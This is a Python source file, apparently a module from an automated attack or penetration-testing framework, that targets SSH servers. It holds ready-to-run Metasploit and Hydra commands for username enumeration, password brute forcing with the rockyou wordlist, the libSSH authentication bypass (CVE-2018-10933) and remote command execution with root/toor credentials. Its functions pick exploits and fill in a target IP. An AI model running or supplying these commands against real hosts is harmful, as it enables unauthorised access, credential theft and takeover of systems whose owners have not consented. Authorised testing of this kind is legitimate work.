"""
SSH Exploit Module — Port 22
Techniques: Brute force, key enumeration, known CVE exploits
"""
import subprocess

MODULE_INFO = {
    "port": 22,
    "service": "ssh",
    "name": "SSH Exploit Module",
    "description": "Credential brute force, user enumeration, and known SSH vulnerabilities",
    "author": "Custom",
    "mitre": ["T1078", "T1110", "T1021.004"],
    "techniques": [
        {"id": "T1110", "name": "Brute Force", "tactic": "Credential Access"},
        {"id": "T1021.004", "name": "Remote Services: SSH", "tactic": "Lateral Movement"},
    ],
}

EXPLOITS = [
    {
        "name": "SSH User Enumeration",
        "source": "metasploit",
        "type": "auxiliary",
        "msf_module": "auxiliary/scanner/ssh/ssh_enumusers",
        "description": "Enumerates valid usernames via timing attack on SSH authentication",
        "exec_command": "msfconsole -q -x 'use auxiliary/scanner/ssh/ssh_enumusers; set RHOSTS {target}; set USER_FILE /usr/share/wordlists/metasploit/unix_users.txt; run; exit'",
        "risk": "Medium — reveals valid accounts for targeted attacks",
    },
    {
        "name": "SSH Brute Force Login",
        "source": "metasploit",
        "type": "auxiliary",
        "msf_module": "auxiliary/scanner/ssh/ssh_login",
        "description": "Attempts credential brute force against SSH with common passwords",
        "exec_command": "msfconsole -q -x 'use auxiliary/scanner/ssh/ssh_login; set RHOSTS {target}; set USER_FILE /usr/share/wordlists/metasploit/unix_users.txt; set PASS_FILE /usr/share/wordlists/rockyou.txt; run; exit'",
        "risk": "High — weak SSH credentials give direct shell access",
    },
    {
        "name": "SSH Version Detection",
        "source": "metasploit",
        "type": "auxiliary",
        "msf_module": "auxiliary/scanner/ssh/ssh_version",
        "description": "Identifies SSH software and version to find known vulnerabilities",
        "exec_command": "msfconsole -q -x 'use auxiliary/scanner/ssh/ssh_version; set RHOSTS {target}; run; exit'",
        "risk": "Info — version fingerprinting for CVE matching",
    },
    {
        "name": "libSSH Authentication Bypass",
        "source": "metasploit",
        "type": "exploit",
        "msf_module": "auxiliary/scanner/ssh/libssh_auth_bypass",
        "description": "Bypasses authentication on vulnerable libSSH servers (CVE-2018-10933)",
        "exec_command": "msfconsole -q -x 'use auxiliary/scanner/ssh/libssh_auth_bypass; set RHOSTS {target}; run; exit'",
        "risk": "Critical — complete authentication bypass gives shell access",
    },
    {
        "name": "SSH Remote Code Execution (sshexec)",
        "source": "metasploit",
        "type": "exploit",
        "msf_module": "exploit/multi/ssh/sshexec",
        "description": "Executes commands on target via valid SSH credentials",
        "exec_command": "msfconsole -q -x 'use exploit/multi/ssh/sshexec; set RHOSTS {target}; set USERNAME root; set PASSWORD toor; run; exit'",
        "risk": "Critical — remote command execution with valid credentials",
    },
    {
        "name": "Hydra SSH Brute Force",
        "source": "custom",
        "type": "exploit",
        "msf_module": "",
        "description": "Fast multi-threaded SSH brute force using Hydra",
        "exec_command": "hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/rockyou.txt ssh://{target} -t 4 -f",
        "risk": "High — fast credential testing",
    },
]


def enumerate(target_ip, service_info=None):
    """Find exploits for SSH service."""
    results = []
    product = (service_info or {}).get("product", "").lower()
    version = (service_info or {}).get("version", "")

    # Always include core checks
    results.extend(EXPLOITS[:3])  # Enum, brute, version

    if "libssh" in product:
        results.append(EXPLOITS[3])

    # Always offer sshexec and hydra
    results.append(EXPLOITS[4])
    results.append(EXPLOITS[5])

    # Searchsploit lookup
    if product and version:
        try:
            r = subprocess.run(
                ["searchsploit", f"{product} {version}", "--json"],
                capture_output=True, text=True, timeout=8,
            )
            if r.returncode == 0:
                import json
                data = json.loads(r.stdout)
                for ex in data.get("RESULTS_EXPLOIT", [])[:3]:
                    results.append({
                        "name": ex.get("Title", "Unknown"),
                        "source": "searchsploit",
                        "type": "exploit",
                        "msf_module": ex.get("Path", ""),
                        "description": f"ExploitDB: {ex.get('Title', '')}",
                        "exec_command": f"searchsploit -m {ex.get('EDB-ID', '')}",
                        "risk": "Varies",
                    })
        except Exception:
            pass

    return results


def exploit(target_ip, port=22, exploit_info=None):
    if not exploit_info:
        exploit_info = EXPLOITS[1]
    cmd = exploit_info.get("exec_command", "").format(target=target_ip)
    return {"command": cmd, "module": exploit_info.get("msf_module", ""),
            "status": "ready", "target": f"{target_ip}:{port}"}
